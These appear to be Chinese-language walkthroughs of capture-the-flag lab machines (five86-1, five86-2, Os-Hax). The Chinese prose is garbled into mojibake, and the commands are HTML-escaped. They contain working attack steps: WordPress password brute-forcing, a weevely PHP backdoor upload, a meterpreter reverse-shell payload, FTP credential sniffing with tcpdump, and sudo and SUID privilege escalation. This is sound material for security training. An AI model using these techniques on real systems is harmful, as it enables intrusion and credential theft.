jen@five86-1Delivery-date: Wed, 01 Jan 2020 03:17:00 -0500Received: from roy by five86-1 with local (Exim 4.92) (envelope-from &lt;roy@five86-1&gt;) id 1imZBc-0001FU-El for jen@five86-1; Wed, 01 Jan 2020 03:17:00 -0500To: jen@five86-1Subject: Monday MossMIME-Version: 1.0Content-Type: text&#x2F;plain; charset&#x3D;&quot;UTF-8&quot;Content-Transfer-Encoding: 8bitMessage-Id: &lt;E1imZBc-0001FU-El@five86-1&gt;From: Roy Trenneman &lt;roy@five86-1&gt;Date: Wed, 01 Jan 2020 03:17:00 -0500Hi Jen,As you know, I&#39;ll be on the &quot;customer service&quot; course on Monday due to that incident on Level 4 with the accounts people.But anyway, I had to change Moss&#39;s password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!Moss will understand (ha ha ha ha).Tanks,Roy è·å¾—è´¦æˆ·mossçš„å¯†ç  åˆ‡æ¢è‡³è´¦æˆ·moss 12su mossFire!Fire! åœ¨è·¯å¾„/home/mossä¸‹å‘ç°éšè—æ–‡ä»¶å¤¹.game è¿›å…¥æ–‡ä»¶å¤¹.gameä¹‹åå‘ç°å­˜åœ¨ä¸€ä¸ªrootæƒé™çš„æ–‡ä»¶upyourgame 123456789101112131415161718ls -latotal 28drwx------ 2 moss moss 4096 Jan 1 03:53 .drwx------ 3 moss moss 4096 Jan 1 23:05 ..lrwxrwxrwx 1 moss moss 21 Jan 1 03:21 battlestar -&gt; &#x2F;usr&#x2F;games&#x2F;battlestarlrwxrwxrwx 1 moss moss 14 Jan 1 03:23 bcd -&gt; &#x2F;usr&#x2F;games&#x2F;bcdlrwxrwxrwx 1 moss moss 21 Jan 1 03:21 bombardier -&gt; &#x2F;usr&#x2F;games&#x2F;bombardierlrwxrwxrwx 1 moss moss 17 Jan 1 03:22 empire -&gt; &#x2F;usr&#x2F;games&#x2F;empirelrwxrwxrwx 1 moss moss 20 Jan 1 03:23 freesweep -&gt; &#x2F;usr&#x2F;games&#x2F;freesweeplrwxrwxrwx 1 moss moss 15 Jan 1 03:23 hunt -&gt; &#x2F;usr&#x2F;games&#x2F;huntlrwxrwxrwx 1 moss moss 20 Jan 1 03:22 ninvaders -&gt; &#x2F;usr&#x2F;games&#x2F;ninvaderslrwxrwxrwx 1 moss moss 17 Jan 1 03:19 nsnake -&gt; &#x2F;usr&#x2F;games&#x2F;nsnakelrwxrwxrwx 1 moss moss 25 Jan 1 03:21 pacman4console -&gt; &#x2F;usr&#x2F;games&#x2F;pacman4consolelrwxrwxrwx 1 moss moss 17 Jan 1 03:22 petris -&gt; &#x2F;usr&#x2F;games&#x2F;petrislrwxrwxrwx 1 moss moss 16 Jan 1 03:22 snake -&gt; &#x2F;usr&#x2F;games&#x2F;snakelrwxrwxrwx 1 moss moss 17 Jan 1 03:20 sudoku -&gt; &#x2F;usr&#x2F;games&#x2F;sudoku-rwsr-xr-x 1 root root 16824 Jan 1 03:52 upyourgamelrwxrwxrwx 1 moss moss 16 Jan 1 03:22 worms -&gt; &#x2F;usr&#x2F;games&#x2F;worms æ‰§è¡Œä¹‹åä»»æ„è¾“å…¥äº”æ¬¡å³å¯è¿›å…¥rootæƒé™ä¸‹çš„sh 1234567891011121314.&#x2F;upyourgame Would you like to play a game? 1Could you please repeat that? 1Nope, you&#39;ll need to enter that again. 1You entered: No. Is this correct? 1We appear to have a problem? Do we have a problem? 1Made in Britain.# iduid&#x3D;0(root) gid&#x3D;1001(moss) groups&#x3D;1001(moss) æ‰‹åŠ¨å¯¼å…¥MSFæ¨¡å— searchsploitå‘½ä»¤æ‰¾åˆ°äº†å­˜å‚¨äºæœ¬åœ°çš„MSFæ¼æ´åˆ©ç”¨æ¨¡å—ï¼Œå…¶è·¯å¾„ä¸º /usr/share/exploitdb/exploits/linux/webapps/47772.rb æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯ 12cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;webapps&#x2F;47772.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;linux&#x2F;http&#x2F;opennetadmin_ping_cmd_injection.rbchmod 644 opennetadmin_ping_cmd_injection.rb.rb ä¹‹ååœ¨MSFä¸­æ‰§è¡Œreload_all cpææƒ ä¹‹å‰çœ‹åˆ°æœ‰æ–‡ç« å¤§æ¦‚åˆ—ä¸¾äº†ä¸€ä¸‹SUIDææƒçš„å‡ ä¸ªæŒ‡ä»¤ï¼Œå…¶ä¸­æœ‰cpå‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰æ–‡ç« æ²¡æœ‰åˆ—ä¸¾å‡ºè¯¦ç»†çš„æ“ä½œè¿‡ç¨‹ ä¸ªäººæƒ³æ³•æ˜¯ç”¨rootæƒé™çš„cpå‘½ä»¤å»è¦†ç›–æ‰passwdæ–‡ä»¶ï¼Œè¿™æ¬¡é¶æœºæ¸—é€å­¦åˆ°äº†ç”¨cpå‘½ä»¤å»å†™å…¥sshä¿¡ä»»ç§˜é’¥æ¥è¿›è¡Œæ°´å¹³ææƒ å¤§æ¦‚ä¸èƒ½å°†åŒæ ·çš„å¥—è·¯ç”¨äºå‚ç›´ææƒè‡³rootï¼Œå› ä¸ºä¸€èˆ¬sshé»˜è®¤ç¦æ­¢æ‰äº†rootç™»å…¥ å‚è€ƒèµ„æ–™ WP five86-2 2020/03/15 21:54:23 ç«¯å£æ‰«æ nmap -p 1-65535 -Pn -T5 -sV -A -n -v 192.168.31.209 123456789101112131415161718192021Nmap scan report for 192.168.31.51Host is up (0.00044s latency).Not shown: 65532 filtered portsPORT STATE SERVICE VERSION21&#x2F;tcp open ftp ProFTPD 1.3.5e80&#x2F;tcp open ssl&#x2F;http Apache&#x2F;2.4.41 (Ubuntu)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http:&#x2F;&#x2F;192.168.31.51&#x2F;MAC Address: 08:00:27:29:D0:EB (Oracle VirtualBox virtual NIC)Device type: general purpose|storage-misc|WAP|media deviceRunning (JUST GUESSING): Linux 2.6.X|3.X|4.X (95%), HP embedded (91%), Netgear RAIDiator 4.X (91%), Ubiquiti AirOS 5.X (90%), ZyXEL embedded (90%), Ubiquiti embedded (90%)OS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6 cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;h:hp:p2000_g3 cpe:&#x2F;o:netgear:raidiator:4.2.24 cpe:&#x2F;o:ubnt:airos:5.2.6 cpe:&#x2F;o:linux:linux_kernel:2.6.32 cpe:&#x2F;h:ubnt:airmax_nanostationAggressive OS guesses: Linux 2.6.32 - 3.13 (95%), Linux 2.6.22 - 2.6.36 (93%), Linux 2.6.32 - 2.6.39 (93%), Linux 2.6.37 (93%), Linux 3.10 - 4.11 (93%), Linux 2.6.39 (93%), Linux 2.6.32 (92%), Linux 3.2 - 4.9 (92%), Linux 2.6.32 - 3.10 (92%), HP P2000 G3 NAS device (91%)No exact OS matches for host (test conditions non-ideal).Uptime guess: 32.468 days (since Tue Feb 11 09:55:14 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Unix Webè·¯å¾„æšä¸¾ dirb http://192.168.31.51/ -w 1234567---- Scanning URL: http:&#x2F;&#x2F;192.168.31.51&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.51&#x2F;index.php (CODE:301|SIZE:0) + http:&#x2F;&#x2F;192.168.31.51&#x2F;server-status (CODE:403|SIZE:278) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-admin&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-content&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-includes&#x2F; + http:&#x2F;&#x2F;192.168.31.51&#x2F;xmlrpc.php (CODE:405|SIZE:42) 80ç«¯å£ä¸Šä»…å­˜åœ¨WordpressæœåŠ¡æ¡†æ¶ æ¼æ´åˆ©ç”¨ æœªæ‰¾åˆ°FTPæœåŠ¡ç‰ˆæœ¬ç›¸å…³æ¼æ´ Wordpressæ·±å…¥ä¿¡æ¯æ”¶é›† æœªæŒ–æ˜å‡ºæœ‰æ¼æ´çš„æ’ä»¶æˆ–ä¸»é¢˜ ç”¨æˆ·æšä¸¾ wpscan --url http://192.168.31.51/ -e u 12345678910111213141516[i] User(s) Identified:[+] admin | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] barney | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] gillian | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] peter | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] stephen | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) æ„é€ ç”¨æˆ·å­—å…¸æ–‡ä»¶ 1234567cat userbarneyadmingillianpeterstephen å°è¯•è¿›è¡Œè´¦æˆ·çˆ†ç ´ wpscan --url http://192.168.31.51/ -U user -P /usr/share/wordlists/rockyou.txt å¾—åˆ°ä¸¤ä¸ªè´¦æˆ· 12barney spooky1stephen apollo1 åœ¨/wp-login.phpç™»å…¥ ç™»å…¥ä¹‹ååœ¨Pluginsé¢æ¿çœ‹åˆ°å­˜åœ¨æ’ä»¶ Insert or Embed Articulate Content into WordPress Trial æœç´¢ç›¸å…³ä¿¡æ¯ 123456789searchsploit Insert or Embed Articulate Content into WordPress------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)------------------------------------------------------------------------------------------- ----------------------------------------WordPress Plugin Insert or Embed Articulate Content into WordPress - Remote Code Execution | exploits&#x2F;php&#x2F;webapps&#x2F;46981.txt------------------------------------------------------------------------------------------- ----------------------------------------Shellcodes: No Result å†æŸ¥çœ‹æ¼æ´çš„å…·ä½“åˆ©ç”¨æ­¥éª¤ cat /usr/share/exploitdb/exploits/php/webapps/46981.txt ä½¿ç”¨weevelyæ„é€ phpåé—¨å¹¶åˆ›å»ºä¸€ä¸ªæ–‡ä»¶index.htmlï¼Œå‹ç¼©æˆzipæ–‡ä»¶ 123weevely generate pass &gt; shell.phpecho &gt; index.htmlzip poc.zip index.html shell.php ç™»å…¥wordpress(å·²ç™»å…¥) ä¾æ¬¡ç‚¹å‡»Posts -&gt; Add New -&gt; Add block -&gt; e-Learning -&gt; UPLOAD -&gt; CHOOES YOUR ZIP FILE -&gt; poc.zip -&gt; UPLOAD! -&gt; Insert As: iFrame -&gt; INSERT æ­¤æ—¶ä¼šæ˜¾ç¤ºå‡ºindex.htmlçš„è·¯å¾„ï¼Œå¤åˆ¶ä¹‹åå°†index.htmlæ”¹ä¸ºshell.phpå³ä¸ºåé—¨è·¯å¾„ è¿æ¥åé—¨ weevely http://five86-2/wp-content/uploads/articulate_uploads/poc/shell.php pass æƒé™æå‡ æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ 12uname -aLinux five86-2 5.3.0-26-generic #28-Ubuntu SMP Wed Dec 18 05:37:46 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux æ„é€ meterpreteråé—¨ç¨‹åº msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9990 -f elf &gt; msf.elf åœ¨MSFä¸­å¼€å¯ç›‘å¬ 12345use exploit&#x2F;multi&#x2F;handler set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp set LHOST 192.168.31.10set LPORT 9990run åœ¨weevelyä¸­ä¸Šä¼ åé—¨ç¨‹åºå¹¶å¯åŠ¨(éœ€è¦å¡«å†™ç»å¯¹è·¯å¾„) 1234file_upload &#x2F;root&#x2F;software&#x2F;msf.elf &#x2F;var&#x2F;www&#x2F;html&#x2F;msf.elfcd &#x2F;var&#x2F;www&#x2F;htmlchmod +x msf.elf.&#x2F;msf.elf åœ¨meterpreterçš„shellä¸­è·å–tty 12shellpython3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; æŸ¥çœ‹æ–‡ä»¶/etc/passwd 12345678910111213141516171819202122232425262728293031323334353637383940414243cat &#x2F;etc&#x2F;passwdroot:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashdaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinmessagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinsyslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinuuidd:x:106:111::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologintcpdump:x:107:112::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinlandscape:x:108:114::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologinpollinate:x:109:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;falsesshd:x:110:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologinlxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;falsemysql:x:111:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;falsebarney:x:1001:1001:Barney Sumner:&#x2F;home&#x2F;barney:&#x2F;bin&#x2F;bashstephen:x:1002:1002:Stephen Morris:&#x2F;home&#x2F;stephen:&#x2F;bin&#x2F;bashpeter:x:1003:1003:Peter Hook:&#x2F;home&#x2F;peter:&#x2F;bin&#x2F;bashgillian:x:1004:1004:Gillian Gilbert:&#x2F;home&#x2F;gillian:&#x2F;bin&#x2F;bashrichard:x:1005:1005:Richard Starkey:&#x2F;home&#x2F;richard:&#x2F;bin&#x2F;bashpaul:x:1006:1006:Paul McCartney:&#x2F;home&#x2F;paul:&#x2F;bin&#x2F;bashjohn:x:1007:1007:John Lennon:&#x2F;home&#x2F;john:&#x2F;bin&#x2F;bashgeorge:x:1008:1008:George Harrison:&#x2F;home&#x2F;george:&#x2F;bin&#x2F;bashdnsmasq:x:114:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin å­˜åœ¨ç”¨æˆ·barneyå’Œstephen å°è¯•å¥—ç”¨Wordpressè´¦æˆ·çš„å¯†ç  å¯ä»¥ç™»å…¥è´¦æˆ·stephen 12su stephenapollo1 æŸ¥çœ‹å½“å‰ç”¨æˆ·ä¿¡æ¯ 12iduid&#x3D;1002(stephen) gid&#x3D;1002(stephen) groups&#x3D;1002(stephen),1009(pcap) æŸ¥çœ‹ç‰¹æƒå‘½ä»¤ 1234567getcap -r &#x2F; 2&gt; &#x2F;dev&#x2F;null&#x2F;usr&#x2F;bin&#x2F;ping &#x3D; cap_net_raw+ep&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils &#x3D; cap_net_raw+ep&#x2F;usr&#x2F;bin&#x2F;mtr-packet &#x3D; cap_net_raw+ep&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;gstreamer1.0&#x2F;gstreamer-1.0&#x2F;gst-ptp-helper &#x3D; cap_net_bind_service,cap_net_admin+ep&#x2F;usr&#x2F;sbin&#x2F;tcpdump &#x3D; cap_net_admin,cap_net_raw+eip å‘ç°å­˜åœ¨tcpdumpç¨‹åºï¼Œå¯ä»¥ç”¨äºç›‘å¬æµé‡ æŸ¥çœ‹ç¨‹åºtcpdumpæ‰€æœ‰è€…ä¸æ‰€æœ‰ç»„ 12ls -l &#x2F;usr&#x2F;sbin&#x2F;tcpdump-rwxr-x--- 1 root pcap 1044232 Oct 11 18:48 &#x2F;usr&#x2F;sbin&#x2F;tcpdump è€Œç”¨æˆ·stephenä¹Ÿå±äºpcapç»„ï¼Œå¯ä»¥ä½¿ç”¨tcpdumpç¨‹åº æŸ¥çœ‹ç³»ç»Ÿå…³äºftpçš„è¿›ç¨‹ 12345678ps -aux | grep ftpsystemd+ 1251 0.0 0.3 119976 1876 pts&#x2F;0 Ss+ 10:21 0:01 proftpd: (accepting connections)paul 2329 0.0 0.1 2600 788 ? Ss 12:00 0:00 &#x2F;bin&#x2F;sh -c &#x2F;home&#x2F;paul&#x2F;ftp_upload.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1paul 2330 0.0 0.1 2600 788 ? S 12:00 0:00 &#x2F;bin&#x2F;sh &#x2F;home&#x2F;paul&#x2F;ftp_upload.shpaul 2331 0.0 0.4 3224 2124 ? S 12:00 0:00 ftp -n 172.18.0.101000 2332 0.0 1.2 133072 6124 pts&#x2F;0 S+ 12:00 0:00 proftpd: paul - 172.18.0.1: STOR file.txtstephen 2335 0.0 0.1 6496 856 pts&#x2F;0 S+ 12:01 0:00 grep ftp ç”¨æˆ·paulæ­£åœ¨æ‰§è¡Œè„šæœ¬ftp_upload.shå’Œå‘½ä»¤ftp -n 172.18.0.10 è€ŒFTPæ˜¯æ˜æ–‡ä¼ è¾“ï¼Œå¯ä»¥é€šè¿‡ç›‘å¬æµé‡æ¥è·å–ä¸€äº›ä¿¡æ¯ æŸ¥çœ‹ç½‘ç»œæ¥å£ 12345678910tcpdump -D1.br-eca3858d86bf [Up, Running]2.eth0 [Up, Running]3.vethf7d5e2c [Up, Running]4.lo [Up, Running, Loopback]5.any (Pseudo-device that captures on all interfaces) [Up, Running]6.docker0 [Up]7.nflog (Linux netfilter log (NFLOG) interface) [none]8.nfqueue (Linux netfilter queue (NFQUEUE) interface) [none] ç›‘å¬æµé‡ä¸€åˆ†é’Ÿ timeout 60 tcpdump -i vethf7d5e2c -w /tmp/cap.pcap æŸ¥çœ‹æµé‡ 123456789tcpdump -r &#x2F;tmp&#x2F;cap.pcap12:12:05.337100 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [P.], seq 1:58, ack 1, win 1019, options [nop,nop,TS val 1753001473 ecr 956298429], length 57: FTP: 220 ProFTPD 1.3.5e Server (Debian) [::ffff:172.18.0.10]12:12:05.337126 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [.], ack 58, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 012:12:05.337305 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [P.], seq 1:12, ack 58, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 11: FTP: USER paul12:12:05.337311 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [.], ack 12, win 1019, options [nop,nop,TS val 1753001473 ecr 956302705], length 012:12:05.337522 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [P.], seq 58:90, ack 12, win 1019, options [nop,nop,TS val 1753001473 ecr 956302705], length 32: FTP: 331 Password required for paul12:12:05.337610 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [.], ack 90, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 012:12:05.337627 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [P.], seq 12:33, ack 90, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 21: FTP: PASS esomepasswford å¾—åˆ°è´¦æˆ·paul:esomepasswford åˆ‡æ¢è‡³è´¦æˆ·paul 12su paulesomepasswford æŸ¥çœ‹sudoæƒé™ 12345678sudo -lMatching Defaults entries for paul on five86-2: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser paul may run the following commands on five86-2: (peter) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;service å¯ä»¥ä»¥ç”¨æˆ·peterçš„æƒé™å»æ‰§è¡Œ/usr/sbin/service å³å¯ä»¥é€šè¿‡è¯¥å‘½ä»¤åˆ‡æ¢è‡³è´¦æˆ·peter sudo -u peter /usr/sbin/service ../../bin/bash æŸ¥çœ‹è¯¥ç”¨æˆ·sudoæƒé™ 123456789sudo -lMatching Defaults entries for peter on five86-2: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser peter may run the following commands on five86-2: (ALL : ALL) ALL (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;passwd å³å¯ç”¨passwdå‘½ä»¤ä¿®æ”¹rootè´¦æˆ·çš„å¯†ç  123sudo -u root passwd roothackforfunhackforfun åˆ‡æ¢è‡³rootè´¦æˆ· 1234su roothackforfunid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) HTTPçˆ†ç ´ æˆ‘åœ¨è‡ªå·±å°è¯•äº†å¼±å£ä»¤å­—å…¸å¤±è´¥åå†æƒ³äº†ä¸€ä¸‹åˆ«çš„æ–¹å‘ï¼Œæ— æœåå»çœ‹å…¶ä»–å¤§ç¥çš„WPï¼Œå‘ç°éœ€è¦ç”¨rockyou.txtï¼Œæœ¬åœ°æµ‹è¯•è·‘å®Œè¿™ä¸ªå­—å…¸éœ€è¦æ•°åä¸ªå°æ—¶ è¿™ä¸€æ­¥çš„è¯å¯èƒ½æ¢ä¸€ä¸ªç®€å•ç‚¹çš„å£ä»¤æˆ–è€…æ”¾ä¸€ä¸ªLFIæ¼æ´å»è¯»passwdç„¶åçˆ†ç ´hashå°±æ›´æ°å½“ç‚¹ FTPæµé‡åŠ«æŒ åšåˆ°æµé‡åŠ«æŒè¿™ä¸€æ­¥æ•´ä¸ªäººå®Œå…¨æ‡µäº†ï¼Œæ²¡æƒ³åˆ°æ˜¯æ€ä¹ˆçœ‹å‡ºæ¥åå°æœ‰FTPä¼ è¾“ä»»åŠ¡ï¼Œé¡ºç€å…¶ä»–å¤§ç¥çš„æ€è·¯æ‰“é€šä¹‹åæµè§ˆäº†ä¸‹é‚£ä¸ªè„šæœ¬ 12345678910111213141516cat ftp_upload.sh#!&#x2F;bin&#x2F;shHOST&#x3D;&#39;172.18.0.10&#39;USER&#x3D;&#39;paul&#39;PASSWD&#x3D;&#39;esomepasswford&#39;FILE&#x3D;&#39;file.txt&#39;ftp -n $HOST &lt;&lt;END_SCRIPTquote USER $USERquote PASS $PASSWDbinaryput $FILEquitEND_SCRIPTexit 0 å¤§æ„åº”è¯¥æ˜¯æŒç»­ç”¨ftpå‘½ä»¤ä¸Šä¼ æ–‡ä»¶file.txt æ‰€ä»¥åœ¨ç”¨å‘½ä»¤ps -aux | grep ftpæ˜¯ä¼šçœ‹åˆ°paulåœ¨æ‰§è¡Œftp -n 172.18.0.10 ä¸ºä»€ä¹ˆæ˜¯ç½‘ç»œæ¥å£vethf7d5e2cè€Œä¸æ˜¯br-eca3858d86bf æœ¬åœ°æ“ä½œæ—¶æ¥å£br-eca3858d86bfçš„ipæ˜¯172.18.0.1ï¼Œè€Œvethf7d5e2cæ²¡æœ‰ipv4åœ°å€ å®é™…æ“ä½œæ—¶åªèƒ½å°è¯•ç›‘å¬æ‰€æœ‰å¯èƒ½çš„ç½‘å¡ capabilities å…³äºlinuxç‰¹æƒ åœ¨ç³»ç»Ÿçš„è§’åº¦æ£€æµ‹érootç”¨æˆ·è¿›è¡Œç‰¹æƒæ“ä½œæ—¶ï¼Œè¯¥å‘½ä»¤æ‰€éœ€çš„æƒé™ä¸è¢«èµ‹äºˆçš„æƒé™æ˜¯å¦ç›¸ç¬¦ getcap -r / 2&gt;/dev/null å‚è€ƒèµ„æ–™ capabilities capabilities manual page WP Os-Hax 2020/03/17 20:53:03 ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.36 12345678910111213141516171819202122232425Nmap scan report for 192.168.31.36Host is up (0.00071s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 43:0e:61:74:5a:cc:e1:6b:72:39:b2:93:4e:e3:d0:81 (RSA)| 256 43:97:64:12:1d:eb:f1:e9:8c:d1:41:6d:ed:a4:5e:9c (ECDSA)|_ 256 e6:3a:13:8a:77:84:be:08:57:d2:36:8a:18:c9:09:d6 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-favicon: Unknown favicon MD5: 5ECF6AFD7D00CCBE6B3C7AA8FD31BDE8| http-methods: |_ Supported Methods: POST OPTIONS GET HEAD|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)|_http-title: Hacker_JamesMAC Address: 08:00:27:0D:02:21 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Uptime guess: 0.070 days (since Tue Mar 17 06:51:52 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Webè·¯å¾„æšä¸¾ å°è¯•çˆ†ç ´80ç«¯å£ä¸‹çš„Webè·¯å¾„ dirb http://192.168.31.36/ -w 12345678---- Scanning URL: http:&#x2F;&#x2F;192.168.31.36&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;css&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;html&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;img&#x2F; + http:&#x2F;&#x2F;192.168.31.36&#x2F;index.html (CODE:200|SIZE:3135) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;js&#x2F; + http:&#x2F;&#x2F;192.168.31.36&#x2F;server-status (CODE:403|SIZE:278) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;wordpress&#x2F; æ¼æ´åˆ©ç”¨ æšä¸¾wordpressè´¦æˆ·çš„ç”¨æˆ·å 1234567wpscan --url http:&#x2F;&#x2F;192.168.31.36&#x2F;wordpress&#x2F; -e u[i] User(s) Identified:[+] web | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) å°è¯•çˆ†ç ´å¼±å£ä»¤ï¼Œå¤±è´¥ 